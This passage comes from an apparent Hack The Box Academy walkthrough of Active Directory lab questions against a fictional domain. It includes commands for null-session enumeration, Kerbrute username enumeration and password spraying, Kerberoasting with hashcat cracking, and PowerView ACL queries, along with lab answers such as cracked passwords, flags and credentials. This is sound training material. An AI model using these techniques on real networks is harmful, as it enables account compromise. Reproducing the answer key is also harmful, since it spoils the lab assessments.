</span><span id="__span-255-7"><a id="__codelineno-255-7" name="__codelineno-255-7"></a>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done
</span><span id="__span-255-8"><a id="__codelineno-255-8" name="__codelineno-255-8"></a>
</span><span id="__span-255-9"><a id="__codelineno-255-9" name="__codelineno-255-9"></a># rpcclient via the SMB NULL session technique:
</span><span id="__span-255-10"><a id="__codelineno-255-10" name="__codelineno-255-10"></a>rpcclient -U &quot;&quot; -N 172.16.5.5
</span><span id="__span-255-11"><a id="__codelineno-255-11" name="__codelineno-255-11"></a>
</span><span id="__span-255-12"><a id="__codelineno-255-12" name="__codelineno-255-12"></a># Now, within rpcclient terminal, enumerate domain password information
</span><span id="__span-255-13"><a id="__codelineno-255-13" name="__codelineno-255-13"></a>getdompwinfo
</span></code></pre></div></td></tr></table></div>
<p>Results: 8</p>
<p><strong>Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-256-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-256-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-256-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-256-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-256-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-256-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-256-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-256-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-256-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-256-10">10</a></span>
<span class="normal"><a href="#__codelineno-256-11">11</a></span>
<span class="normal"><a href="#__codelineno-256-12">12</a></span>
<span class="normal"><a href="#__codelineno-256-13">13</a></span>
<span class="normal"><a href="#__codelineno-256-14">14</a></span>
<span class="normal"><a href="#__codelineno-256-15">15</a></span>
<span class="normal"><a href="#__codelineno-256-16">16</a></span>
<span class="normal"><a href="#__codelineno-256-17">17</a></span>
<span class="normal"><a href="#__codelineno-256-18">18</a></span>
<span class="normal"><a href="#__codelineno-256-19">19</a></span>
<span class="normal"><a href="#__codelineno-256-20">20</a></span>
<span class="normal"><a href="#__codelineno-256-21">21</a></span>
<span class="normal"><a href="#__codelineno-256-22">22</a></span>
<span class="normal"><a href="#__codelineno-256-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-256-1"><a id="__codelineno-256-1" name="__codelineno-256-1"></a>sudo git clone https://github.com/ropnop/kerbrute.git
</span><span id="__span-256-2"><a id="__codelineno-256-2" name="__codelineno-256-2"></a>
</span><span id="__span-256-3"><a id="__codelineno-256-3" name="__codelineno-256-3"></a># Typing make help will show us the compiling options available.
</span><span id="__span-256-4"><a id="__codelineno-256-4" name="__codelineno-256-4"></a>cd kerbrute
</span><span id="__span-256-5"><a id="__codelineno-256-5" name="__codelineno-256-5"></a>make help
</span><span id="__span-256-6"><a id="__codelineno-256-6" name="__codelineno-256-6"></a>
</span><span id="__span-256-7"><a id="__codelineno-256-7" name="__codelineno-256-7"></a># type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
</span><span id="__span-256-8"><a id="__codelineno-256-8" name="__codelineno-256-8"></a>sudo make all
</span><span id="__span-256-9"><a id="__codelineno-256-9" name="__codelineno-256-9"></a>
</span><span id="__span-256-10"><a id="__codelineno-256-10" name="__codelineno-256-10"></a># The newly created dist directory will contain our compiled binaries.
</span><span id="__span-256-11"><a id="__codelineno-256-11" name="__codelineno-256-11"></a>ls -la dist
</span><span id="__span-256-12"><a id="__codelineno-256-12" name="__codelineno-256-12"></a>
</span><span id="__span-256-13"><a id="__codelineno-256-13" name="__codelineno-256-13"></a>cd dist
</span><span id="__span-256-14"><a id="__codelineno-256-14" name="__codelineno-256-14"></a>python3 -m http.server 8001
</span><span id="__span-256-15"><a id="__codelineno-256-15" name="__codelineno-256-15"></a>
</span><span id="__span-256-16"><a id="__codelineno-256-16" name="__codelineno-256-16"></a># Connec to the pivot host
</span><span id="__span-256-17"><a id="__codelineno-256-17" name="__codelineno-256-17"></a>ssh htb-student@$ip
</span><span id="__span-256-18"><a id="__codelineno-256-18" name="__codelineno-256-18"></a>wget http://$ipAttacker:8001 kerbrute_linux_amd64 
</span><span id="__span-256-19"><a id="__codelineno-256-19" name="__codelineno-256-19"></a>
</span><span id="__span-256-20"><a id="__codelineno-256-20" name="__codelineno-256-20"></a># Also download the jsmith.txt from https://github.com/insidetrust/statistically-likely-usernames/tree/master 
</span><span id="__span-256-21"><a id="__codelineno-256-21" name="__codelineno-256-21"></a>
</span><span id="__span-256-22"><a id="__codelineno-256-22" name="__codelineno-256-22"></a># Run kerbrute from the pivot host
</span><span id="__span-256-23"><a id="__codelineno-256-23" name="__codelineno-256-23"></a>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
</span></code></pre></div></td></tr></table></div>
<p>Results: 56 </p>
<h3 id="spray-responsibly">Spray Responsibly</h3>
<p><strong>Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-257-1">1</a></span>
<span class="normal"><a href="#__codelineno-257-2">2</a></span>
<span class="normal"><a href="#__codelineno-257-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-257-1"><a id="__codelineno-257-1" name="__codelineno-257-1"></a>./kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
</span><span id="__span-257-2"><a id="__codelineno-257-2" name="__codelineno-257-2"></a>
</span><span id="__span-257-3"><a id="__codelineno-257-3" name="__codelineno-257-3"></a>./kerbrute_linux_386 passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
</span></code></pre></div></td></tr></table></div>
<p>Results: sgage</p>
<p><strong>RDP to $ip (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-258-1">1</a></span>
<span class="normal"><a href="#__codelineno-258-2">2</a></span>
<span class="normal"><a href="#__codelineno-258-3">3</a></span>
<span class="normal"><a href="#__codelineno-258-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-258-1"><a id="__codelineno-258-1" name="__codelineno-258-1"></a># Open powershell as Admin
</span><span id="__span-258-2"><a id="__codelineno-258-2" name="__codelineno-258-2"></a>Import-Module .\DomainPasswordSpray.ps1 
</span><span id="__span-258-3"><a id="__codelineno-258-3" name="__codelineno-258-3"></a>
</span><span id="__span-258-4"><a id="__codelineno-258-4" name="__codelineno-258-4"></a>Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue 
</span></code></pre></div></td></tr></table></div>
<p>Results: dbranch</p>
<h3 id="deeper-down-the-rabbit-hole">Deeper Down the Rabbit Hole</h3>
<p><strong>What AD User has a RID equal to Decimal 1170?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-259-1">1</a></span>
<span class="normal"><a href="#__codelineno-259-2">2</a></span>
<span class="normal"><a href="#__codelineno-259-3">3</a></span>
<span class="normal"><a href="#__codelineno-259-4">4</a></span>
<span class="normal"><a href="#__codelineno-259-5">5</a></span>
<span class="normal"><a href="#__codelineno-259-6">6</a></span>
<span class="normal"><a href="#__codelineno-259-7">7</a></span>
<span class="normal"><a href="#__codelineno-259-8">8</a></span>
<span class="normal"><a href="#__codelineno-259-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-259-1"><a id="__codelineno-259-1" name="__codelineno-259-1"></a>ssh htb-student@$ip
</span><span id="__span-259-2"><a id="__codelineno-259-2" name="__codelineno-259-2"></a>rpcclient -U forend 172.16.5.5
</span><span id="__span-259-3"><a id="__codelineno-259-3" name="__codelineno-259-3"></a># Enter password when prompted
</span><span id="__span-259-4"><a id="__codelineno-259-4" name="__codelineno-259-4"></a>
</span><span id="__span-259-5"><a id="__codelineno-259-5" name="__codelineno-259-5"></a># In the console of developer tools:
</span><span id="__span-259-6"><a id="__codelineno-259-6" name="__codelineno-259-6"></a>number=1170; number.toString(16);
</span><span id="__span-259-7"><a id="__codelineno-259-7" name="__codelineno-259-7"></a># We obtain 457 as the hex value for that user RID
</span><span id="__span-259-8"><a id="__codelineno-259-8" name="__codelineno-259-8"></a>
</span><span id="__span-259-9"><a id="__codelineno-259-9" name="__codelineno-259-9"></a>queryuser 0x457
</span></code></pre></div></td></tr></table></div>
<p>Results: mmorgan</p>
<p><strong>What is the membercount: of the "Interns" group?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-260-1">1</a></span>
<span class="normal"><a href="#__codelineno-260-2">2</a></span>
<span class="normal"><a href="#__codelineno-260-3">3</a></span>
<span class="normal"><a href="#__codelineno-260-4">4</a></span>
<span class="normal"><a href="#__codelineno-260-5">5</a></span>
<span class="normal"><a href="#__codelineno-260-6">6</a></span>
<span class="normal"><a href="#__codelineno-260-7">7</a></span>
<span class="normal"><a href="#__codelineno-260-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-260-1"><a id="__codelineno-260-1" name="__codelineno-260-1"></a># Connect to the machine via ssh
</span><span id="__span-260-2"><a id="__codelineno-260-2" name="__codelineno-260-2"></a>ssh htb-student@$ip
</span><span id="__span-260-3"><a id="__codelineno-260-3" name="__codelineno-260-3"></a>
</span><span id="__span-260-4"><a id="__codelineno-260-4" name="__codelineno-260-4"></a># ping sweet the network from than machine
</span><span id="__span-260-5"><a id="__codelineno-260-5" name="__codelineno-260-5"></a>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done
</span><span id="__span-260-6"><a id="__codelineno-260-6" name="__codelineno-260-6"></a>
</span><span id="__span-260-7"><a id="__codelineno-260-7" name="__codelineno-260-7"></a># After determining the target 172.16.5.5, we can enumerate groups with provided creds, and filter by &quot;Interns&quot;
</span><span id="__span-260-8"><a id="__codelineno-260-8" name="__codelineno-260-8"></a>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep Interns
</span></code></pre></div></td></tr></table></div>
<p>Results: 10</p>
<p>RDP to 10.129.147.147 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". <strong>Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)</strong></p>
<p><a href="../bloodhound/">For installing and using bloodhound</a>.</p>
<p><img alt="Bloodhound" src="../img/blood.png" /></p>
<p>Results: 13</p>
<p><strong>What PowerView function allows us to test if a user has administrative access to a local or remote host?</strong></p>
<p>Results: Test-AdminAccess</p>
<p><strong>Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?</strong></p>
<p>Results: sa</p>
<p><strong>What is the password for the database user?</strong></p>
<p>Results: ILFREIGHTDB01!</p>
<p><strong>RDP to 10.129.147.147 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". Enumerate the host's security configuration information and provide its AMProductVersion.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-261-1">1</a></span>
<span class="normal"><a href="#__codelineno-261-2">2</a></span>
<span class="normal"><a href="#__codelineno-261-3">3</a></span>
<span class="normal"><a href="#__codelineno-261-4">4</a></span>
<span class="normal"><a href="#__codelineno-261-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-261-1"><a id="__codelineno-261-1" name="__codelineno-261-1"></a># To RDP 
</span><span id="__span-261-2"><a id="__codelineno-261-2" name="__codelineno-261-2"></a>xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution
</span><span id="__span-261-3"><a id="__codelineno-261-3" name="__codelineno-261-3"></a>
</span><span id="__span-261-4"><a id="__codelineno-261-4" name="__codelineno-261-4"></a># Get the current Defender status.
</span><span id="__span-261-5"><a id="__codelineno-261-5" name="__codelineno-261-5"></a>Get-MpComputerStatus
</span></code></pre></div></td></tr></table></div>
<p>Results: 4.18.2109.6  </p>
<p>What domain user is explicitly listed as a member of the local Administrators group on the target host?</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-262-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-262-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-262-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-262-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-262-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-262-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-262-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-262-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-262-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-262-10">10</a></span>
<span class="normal"><a href="#__codelineno-262-11">11</a></span>
<span class="normal"><a href="#__codelineno-262-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-262-1"><a id="__codelineno-262-1" name="__codelineno-262-1"></a># To RDP 
</span><span id="__span-262-2"><a id="__codelineno-262-2" name="__codelineno-262-2"></a>xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution
</span><span id="__span-262-3"><a id="__codelineno-262-3" name="__codelineno-262-3"></a>
</span><span id="__span-262-4"><a id="__codelineno-262-4" name="__codelineno-262-4"></a># Get members of Local Administrators group
</span><span id="__span-262-5"><a id="__codelineno-262-5" name="__codelineno-262-5"></a>net localgroup Administrators
</span><span id="__span-262-6"><a id="__codelineno-262-6" name="__codelineno-262-6"></a>
</span><span id="__span-262-7"><a id="__codelineno-262-7" name="__codelineno-262-7"></a># In the results you will see:
</span><span id="__span-262-8"><a id="__codelineno-262-8" name="__codelineno-262-8"></a>Members                                                                    -----------------------------------                                        Administrator
</span><span id="__span-262-9"><a id="__codelineno-262-9" name="__codelineno-262-9"></a>INLANEFREIGHT\adunn
</span><span id="__span-262-10"><a id="__codelineno-262-10" name="__codelineno-262-10"></a>INLANEFREIGHT\Domain Admins
</span><span id="__span-262-11"><a id="__codelineno-262-11" name="__codelineno-262-11"></a>INLANEFREIGHT\Domain Users
</span><span id="__span-262-12"><a id="__codelineno-262-12" name="__codelineno-262-12"></a>The command completed successfully.
</span></code></pre></div></td></tr></table></div>
<p>Results: adunn</p>
<p><strong>Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-263-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-263-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-263-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-263-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-263-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-263-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-263-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-263-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-263-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-263-10">10</a></span>
<span class="normal"><a href="#__codelineno-263-11">11</a></span>
<span class="normal"><a href="#__codelineno-263-12">12</a></span>
<span class="normal"><a href="#__codelineno-263-13">13</a></span>
<span class="normal"><a href="#__codelineno-263-14">14</a></span>
<span class="normal"><a href="#__codelineno-263-15">15</a></span>
<span class="normal"><a href="#__codelineno-263-16">16</a></span>
<span class="normal"><a href="#__codelineno-263-17">17</a></span>
<span class="normal"><a href="#__codelineno-263-18">18</a></span>
<span class="normal"><a href="#__codelineno-263-19">19</a></span>
<span class="normal"><a href="#__codelineno-263-20">20</a></span>
<span class="normal"><a href="#__codelineno-263-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-263-1"><a id="__codelineno-263-1" name="__codelineno-263-1"></a># To RDP 
</span><span id="__span-263-2"><a id="__codelineno-263-2" name="__codelineno-263-2"></a>xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution
</span><span id="__span-263-3"><a id="__codelineno-263-3" name="__codelineno-263-3"></a>
</span><span id="__span-263-4"><a id="__codelineno-263-4" name="__codelineno-263-4"></a>##########
</span><span id="__span-263-5"><a id="__codelineno-263-5" name="__codelineno-263-5"></a># With Get-AD 
</span><span id="__span-263-6"><a id="__codelineno-263-6" name="__codelineno-263-6"></a>##########
</span><span id="__span-263-7"><a id="__codelineno-263-7" name="__codelineno-263-7"></a># Lists disabled users with LDAP and returns their samAccountName
</span><span id="__span-263-8"><a id="__codelineno-263-8" name="__codelineno-263-8"></a>Get-ADUser -LDAPFilter &#39;(userAccountControl:1.2.840.113556.1.4.803:=2)&#39; | select samaccountname
</span><span id="__span-263-9"><a id="__codelineno-263-9" name="__codelineno-263-9"></a>
</span><span id="__span-263-10"><a id="__codelineno-263-10" name="__codelineno-263-10"></a># Gets details about one of the users obtained
</span><span id="__span-263-11"><a id="__codelineno-263-11" name="__codelineno-263-11"></a>Get-ADUser -Identity bross -Properties * 
</span><span id="__span-263-12"><a id="__codelineno-263-12" name="__codelineno-263-12"></a># Flag will be in the description field
</span><span id="__span-263-13"><a id="__codelineno-263-13" name="__codelineno-263-13"></a>
</span><span id="__span-263-14"><a id="__codelineno-263-14" name="__codelineno-263-14"></a>#########
</span><span id="__span-263-15"><a id="__codelineno-263-15" name="__codelineno-263-15"></a># With dsquery
</span><span id="__span-263-16"><a id="__codelineno-263-16" name="__codelineno-263-16"></a>#########
</span><span id="__span-263-17"><a id="__codelineno-263-17" name="__codelineno-263-17"></a># Lists disabled users with LDAP and returns their samAccountName
</span><span id="__span-263-18"><a id="__codelineno-263-18" name="__codelineno-263-18"></a>dsquery * -filter &quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))&quot; -attr SamAccountName    
</span><span id="__span-263-19"><a id="__codelineno-263-19" name="__codelineno-263-19"></a>
</span><span id="__span-263-20"><a id="__codelineno-263-20" name="__codelineno-263-20"></a># Gets details about one of the users obtained
</span><span id="__span-263-21"><a id="__codelineno-263-21" name="__codelineno-263-21"></a>net user bross /domain 
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{LD@P_I$_W1ld}</p>
<h3 id="cooking-with-fire">Cooking with Fire</h3>
<p><strong>SSH to $ip (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!". Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-264-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-264-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-264-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-264-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-264-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-264-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-264-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-264-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-264-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-264-10">10</a></span>
<span class="normal"><a href="#__codelineno-264-11">11</a></span>
<span class="normal"><a href="#__codelineno-264-12">12</a></span>
<span class="normal"><a href="#__codelineno-264-13">13</a></span>
<span class="normal"><a href="#__codelineno-264-14">14</a></span>
<span class="normal"><a href="#__codelineno-264-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-264-1"><a id="__codelineno-264-1" name="__codelineno-264-1"></a># Connect via ssh
</span><span id="__span-264-2"><a id="__codelineno-264-2" name="__codelineno-264-2"></a>ssh htb-student@$ip
</span><span id="__span-264-3"><a id="__codelineno-264-3" name="__codelineno-264-3"></a>
</span><span id="__span-264-4"><a id="__codelineno-264-4" name="__codelineno-264-4"></a># Enumerate the network
</span><span id="__span-264-5"><a id="__codelineno-264-5" name="__codelineno-264-5"></a>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done
</span><span id="__span-264-6"><a id="__codelineno-264-6" name="__codelineno-264-6"></a>
</span><span id="__span-264-7"><a id="__codelineno-264-7" name="__codelineno-264-7"></a># Enumerate SPNs in the Domain and we will see SAPService among them
</span><span id="__span-264-8"><a id="__codelineno-264-8" name="__codelineno-264-8"></a>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
</span><span id="__span-264-9"><a id="__codelineno-264-9" name="__codelineno-264-9"></a># When prompted for the password, enter Klmcargo2
</span><span id="__span-264-10"><a id="__codelineno-264-10" name="__codelineno-264-10"></a>
</span><span id="__span-264-11"><a id="__codelineno-264-11" name="__codelineno-264-11"></a># Generate TGD ticket for the SAPService account
</span><span id="__span-264-12"><a id="__codelineno-264-12" name="__codelineno-264-12"></a>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile ker
</span><span id="__span-264-13"><a id="__codelineno-264-13" name="__codelineno-264-13"></a>
</span><span id="__span-264-14"><a id="__codelineno-264-14" name="__codelineno-264-14"></a># Copy the ker file content to our kali attacker machine and crack it
</span><span id="__span-264-15"><a id="__codelineno-264-15" name="__codelineno-264-15"></a>hashcat -m 13100 ker /usr/share/wordlists/rockyou.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: !SapperFi2</p>
<p><strong>What powerful local group on the Domain Controller is the SAPService user a member of?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-265-1">1</a></span>
<span class="normal"><a href="#__codelineno-265-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-265-1"><a id="__codelineno-265-1" name="__codelineno-265-1"></a>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
</span><span id="__span-265-2"><a id="__codelineno-265-2" name="__codelineno-265-2"></a># When prompted for the password, enter Klmcargo2. You will also obtain the groups that the user belongs to.
</span></code></pre></div></td></tr></table></div>
<p>Results: Account Operators</p>
<p><strong>What is the name of the service account with the SPN 'vmware/inlanefreight.local'?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-266-1">1</a></span>
<span class="normal"><a href="#__codelineno-266-2">2</a></span>
<span class="normal"><a href="#__codelineno-266-3">3</a></span>
<span class="normal"><a href="#__codelineno-266-4">4</a></span>
<span class="normal"><a href="#__codelineno-266-5">5</a></span>
<span class="normal"><a href="#__codelineno-266-6">6</a></span>
<span class="normal"><a href="#__codelineno-266-7">7</a></span>
<span class="normal"><a href="#__codelineno-266-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-266-1"><a id="__codelineno-266-1" name="__codelineno-266-1"></a># Connect via rdp
</span><span id="__span-266-2"><a id="__codelineno-266-2" name="__codelineno-266-2"></a>xfreerdp /v:$ip /u:$user /cert:ignore
</span><span id="__span-266-3"><a id="__codelineno-266-3" name="__codelineno-266-3"></a>
</span><span id="__span-266-4"><a id="__codelineno-266-4" name="__codelineno-266-4"></a># List SPNs
</span><span id="__span-266-5"><a id="__codelineno-266-5" name="__codelineno-266-5"></a>setspn.exe -Q */*
</span><span id="__span-266-6"><a id="__codelineno-266-6" name="__codelineno-266-6"></a># And pay attention to the firsts in the list:
</span><span id="__span-266-7"><a id="__codelineno-266-7" name="__codelineno-266-7"></a># CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
</span><span id="__span-266-8"><a id="__codelineno-266-8" name="__codelineno-266-8"></a># vmware/inlanefreight.local  
</span></code></pre></div></td></tr></table></div>
<p>Results: svc_vmwaresso</p>
<p><strong>Crack the password for this account and submit it as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-267-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-267-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-267-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-267-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-267-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-267-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-267-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-267-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-267-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-267-10">10</a></span>
<span class="normal"><a href="#__codelineno-267-11">11</a></span>
<span class="normal"><a href="#__codelineno-267-12">12</a></span>
<span class="normal"><a href="#__codelineno-267-13">13</a></span>
<span class="normal"><a href="#__codelineno-267-14">14</a></span>
<span class="normal"><a href="#__codelineno-267-15">15</a></span>
<span class="normal"><a href="#__codelineno-267-16">16</a></span>
<span class="normal"><a href="#__codelineno-267-17">17</a></span>
<span class="normal"><a href="#__codelineno-267-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-267-1"><a id="__codelineno-267-1" name="__codelineno-267-1"></a># Connect via rdp
</span><span id="__span-267-2"><a id="__codelineno-267-2" name="__codelineno-267-2"></a>xfreerdp /v:$ip /u:$user /cert:ignore
</span><span id="__span-267-3"><a id="__codelineno-267-3" name="__codelineno-267-3"></a>
</span><span id="__span-267-4"><a id="__codelineno-267-4" name="__codelineno-267-4"></a># Go to tools
</span><span id="__span-267-5"><a id="__codelineno-267-5" name="__codelineno-267-5"></a>cd C:\Tools
</span><span id="__span-267-6"><a id="__codelineno-267-6" name="__codelineno-267-6"></a>
</span><span id="__span-267-7"><a id="__codelineno-267-7" name="__codelineno-267-7"></a># Import PowerView
</span><span id="__span-267-8"><a id="__codelineno-267-8" name="__codelineno-267-8"></a>Import-module .\PowerView.ps1
</span><span id="__span-267-9"><a id="__codelineno-267-9" name="__codelineno-267-9"></a>
</span><span id="__span-267-10"><a id="__codelineno-267-10" name="__codelineno-267-10"></a># List SPNs and returns their SamAccountName
</span><span id="__span-267-11"><a id="__codelineno-267-11" name="__codelineno-267-11"></a>Get-DomainUser * -spn | select samaccountname 
</span><span id="__span-267-12"><a id="__codelineno-267-12" name="__codelineno-267-12"></a>
</span><span id="__span-267-13"><a id="__codelineno-267-13" name="__codelineno-267-13"></a>#  Generate a TGS ticker for a specific user:
</span><span id="__span-267-14"><a id="__codelineno-267-14" name="__codelineno-267-14"></a>Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat
</span><span id="__span-267-15"><a id="__codelineno-267-15" name="__codelineno-267-15"></a>
</span><span id="__span-267-16"><a id="__codelineno-267-16" name="__codelineno-267-16"></a># After copying the ticket to the kali machine and removing blank spaces, crack it with hashcat
</span><span id="__span-267-17"><a id="__codelineno-267-17" name="__codelineno-267-17"></a>cat rc4_to_crack | tr -d \\n &gt; hash.txt
</span><span id="__span-267-18"><a id="__codelineno-267-18" name="__codelineno-267-18"></a>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
</span></code></pre></div></td></tr></table></div>
<p>Results: Virtual01</p>
<h3 id="an-ace-in-the-hole">An ACE in the Hole</h3>
<p><strong>What type of ACL defines which security principals are granted or denied access to an object? (one word)</strong>
Results: DACL</p>
<p><strong>Which ACE entry can be leveraged to perform a targeted Kerberoasting attack?</strong>
Results: GenericAll </p>
<p><strong>What is the rights GUID for User-Force-Change-Password?</strong>
Results:</p>
<p><strong>What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?</strong>
Results: ResolveGUIDs</p>
<p>What privileges does the user damundsen have over the Help Desk Level 1 group?</p>
<p><div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-268-1">1</a></span>
<span class="normal"><a href="#__codelineno-268-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-268-1"><a id="__codelineno-268-1" name="__codelineno-268-1"></a>$sid2 = Convert-NameToSid damundsen
</span><span id="__span-268-2"><a id="__codelineno-268-2" name="__codelineno-268-2"></a>Get-DomainObjectACL -Identity &quot;Help Desk Level 1&quot; -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
</span></code></pre></div></td></tr></table></div>
This can also be done with other tools such as Bloodhound, installed under C:\Tools.
Results: GenericWrite</p>
<p><strong>Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).</strong></p>
<p><div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-269-1">1</a></span>
<span class="normal"><a href="#__codelineno-269-2">2</a></span>
